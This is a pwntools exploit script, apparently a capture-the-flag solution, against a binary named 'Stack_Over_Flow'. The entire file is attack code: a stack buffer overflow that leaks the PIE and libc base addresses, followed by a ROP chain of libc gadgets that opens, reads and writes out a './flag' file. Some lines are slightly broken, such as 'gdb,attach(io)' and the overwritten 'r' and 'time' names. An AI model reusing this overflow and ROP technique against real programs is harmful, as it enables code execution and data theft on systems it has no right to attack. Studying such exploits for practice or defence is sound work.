from pwn import*
# from LibcSearcher import*
import ctypes
import time
context(os = "linux",arch = "amd64",log_level = "debug")
binary = "./Stack_Over_Flow"
if args["REMOTE"]:
   io = remote("127.0.0.1",8080)
else : 
   io = process(binary) 
elf = ELF(binary)
libc = ELF("./libc.so.6")
lib = ctypes.CDLL('libc.so.6')

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim),data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, droio=False  :io.recvuntil(delims, droio)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} is---->{:#x}'.format(name, addr))
l64     = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def bug():
    gdb.attach(io)
    pause()

# ================return to magic ; print main*qword_4038 ========================
pay = b'a'*(0x100)+b'b'*8+p8(0x5f)
sa("Good luck!",pay)

# ================Use ctypes ; leak PIE_base ========================
ru(b'magic number:')
leak_number =int(r(16),10)
print(f"lean_num is {hex(leak_number)}")
for i in range(3,5):
    main_addr = leak_number//i
    if (main_addr&0xff)==0xb0:
        PIE_base = main_addr - 0x16B0
        print(f"PIE_base is =====>{hex(PIE_base)}")

# ================leak libc_addr ===================================
time = elf.plt.time+PIE_base
rand = elf.plt.rand+PIE_base
puts = elf.plt.puts+PIE_base
second_fun = PIE_base+0x161F
ret = PIE_base+0x101a
pay = b'a'*(0x100)+b'b'*8+p64(rand)+p64(puts)+p64(second_fun)
sa("Good luck!",pay)
libc_base = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) & 0xfffffffffffff000
libc_base = libc_base-0x21a000
leak("libc_base",libc_base)
leak("write",libc.sym.write)

# ====================ORW ===================================
#0x000000000002a3e5 : pop rdi ; ret
#0x000000000002be51 : pop rsi ; ret
#0x000000000011f357 : pop rdx ; pop r12 ; ret
#0x0000000000045eb0 ：pop rax ; ret
#0x00000000000904a9 : pop rdx ; pop rbx ; ret
rdi = 0x000000000002a3e5+libc_base
rsi = 0x2be51+libc_base
rdx_r12 = 0x11f357+libc_base
rdx_rbx = 0x904a9+libc_base 
rcx = 0x3d1ee+libc_base
rax = 0x045eb0+libc_base
syscall = 0x29db4+libc_base
read = libc_base+libc.sym.read
#read = PIE_base+libc.plt.read
open = libc_base + libc.sym.open
pread = libc_base + libc.sym.pread
write = libc_base + libc.sym.write
dup2 = libc_base + libc.sym.dup2
sendfile = libc_base + libc.sym.sendfile

bss = PIE_base+0x4a00
exit = PIE_base+elf.sym.exit
flag = PIE_base+0x4c00
# openat:257---libc write:1----libc pread:17-----libc pread(fd, buf, count, offset)
#pay = b'a'*(0x100)+b'b'*8

# read flag
pay = p64(rdi)+p64(0)+p64(rsi)+p64(bss)
pay += p64(rdx_rbx)+p64(8)*2
pay += p64(read)
# open 
o = p64(rdi)+p64(bss)
o += p64(rsi)+p64(0)
o += p64(rdx_rbx)+p64(0)*2
o += p64(open)

# dup2
d = p64(rdi)+p64(3)
d += p64(rsi)+p64(0)
d += p64(dup2)
# read
r = p64(rdi)+p64(0)
r += p64(rsi)+p64(flag)
r += p64(rdx_rbx)+p64(0x50)*2
r += p64(read)

# pead
pr = p64(rdi)+p64(0)
pr += p64(rsi)+p64(flag)
pr += p64(rdx_rbx)+p64(0x50)*2
pr += p64(pread)


# write
w = p64(rdi)+p64(1)
w += p64(rsi)+p64(flag)
w += p64(rdx_rbx)+p64(0x50)*2
w += p64(write)


payload = b'a'*(0x110)
payload += pay+o+d+r+w
sa("Good luck!",payload)
sleep(0.1)
gdb,attach(io)
s("./flag\x00\x00")
pause()
itr()

